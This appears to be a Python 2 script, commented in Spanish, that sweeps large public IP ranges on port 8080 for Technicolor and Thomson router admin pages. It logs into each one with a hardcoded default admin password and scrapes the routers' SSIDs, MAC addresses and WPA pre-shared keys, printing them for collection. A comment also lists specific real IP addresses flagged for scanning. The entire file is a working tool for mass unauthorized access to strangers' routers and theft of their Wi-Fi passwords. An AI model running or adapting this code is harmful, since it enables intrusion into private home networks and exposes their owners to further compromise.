# -*- coding: utf-8 -*-
import requests as rq
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as BS
import socket
import csv

tech = 0
tom = 0
header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
#181.52.82.215 181.54.153.14 http://186.87.3.237:8080/wlanRadio.asp 180-50 http://181.50.1.32:8080/wlanPrimaryNetwork.asp<<<< escanear esto
router = open('db.csv','a+')
x = open('db.csv','r')
host = csv.reader(x, delimiter=',')
for row in host:
    router.write('\n')
    for i in range(190,255): ##190.24.3.17
    
        a = str(i)
        for j in range(24,255):
            b = str(j)
       
            for p in range(3,255):
                c = str(p)
                for u in range(1,255):
                    
                    d = str(u)
                    ip = str(i)+'.'+str(j)+'.'+str(p)+'.'+str(u)
                    

                    l=row[0]
                    if a != ip:
                        try:
                            r1 = rq.get('http://'+ip+':8080/', timeout=3, headers=header)
                            head = r1.headers
                            b = 'WWW-Authenticate' in head
                            if b==True:
                                
                                thom = 'Basic realm="Thomson"'
                                techni = 'Basic realm="Technicolor"'
                                r = rq.get('http://'+ip+':8080/', timeout=1)
                                n = r.headers['WWW-Authenticate']
                                if n == techni: ##Technicolor
                                    tech = tech+1
                                    try:
                                        r2 = rq.get('http://'+ip+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                                        guess = rq.get('http://'+ip+':8080/wlanGuestNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                                        bs1 = BS(r2.content, "html.parser")
                                        for name in bs1.find_all("td", align="middle"):
                                            t = name.text[16:]
                                            ma = t[-19:]
                                            mac = ma[1:-1]
                                            ssid = t[0:-19]
                                            for pwd in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                                #router.write(ip+','+'Technicolor'+','+str(mac)+','+str(ssid)+','+str(pwd["value"])+',enable'+'\n')
                                                print ip+".....Technicolor..........."+str(mac)+'.......'+str(ssid)+"....."+pwd["value"]+'......Guess Enable'
                                                
                                    except rq.exceptions.ConnectionError: 
                                        rn = rq.get('http://'+ip+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                                        bsn = BS(rn.content, "html.parser")
                                        for name in bsn.find_all("td", align="middle"):
                                            t = name.text[24:]
                                            ma = t[-19:]
                                            mac = ma[1:-1]
                                            ssid = t[0:-19]
                                            for pwd in bsn.find_all("input", {'name':"WpaPreSharedKey"}):
                                                #router.write(ip+','+'Technicolor'+','+str(mac)+','+str(ssid)+','+str(pwd["value"])+',disable'+'\n')
                                                print ip+".....Technicolor..........."+str(mac)+'.......'+str(ssid)+"....."+pwd["value"]+'......Guess Disable'
                        
                                elif n==thom: ##Thomson
                                    tom = tom+1
                                    r3 = rq.get('http://' + ip + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                                    r4 = rq.get('http://' + ip + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                                    parser = r4.content
                                    bs1 = BS(parser, "html.parser")
                                    for name in bs1.find_all("td", align="middle"):
                                        t = name.text[16:]
                                        ma = t[-19:]
                                        mac = ma[1:-1]
                                        ssid = t[0:-19]
                                        for pws in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                            #router.write(ip+','+'Thomson'+','+str(mac)+','+str(ssid)+','+str(pws["value"])+','+'\n')
                                            print ip+".....Thomson..............."+str(mac)+'.......'+str(ssid)+"....."+pws["value"]
                        
                        except rq.exceptions.Timeout:
                            pass
                        except KeyError:
                            pass
                        except socket.timeout:
                            pass
                        except rq.exceptions.ConnectionError:
                            pass
                        
                        
                    else:
                        print 'ip repetida.....'+ip
                
        
router.close()
print str(tech)+" technicolor"
print str(tom)+" tomson"
print str(tech+tom)+" En total"

    
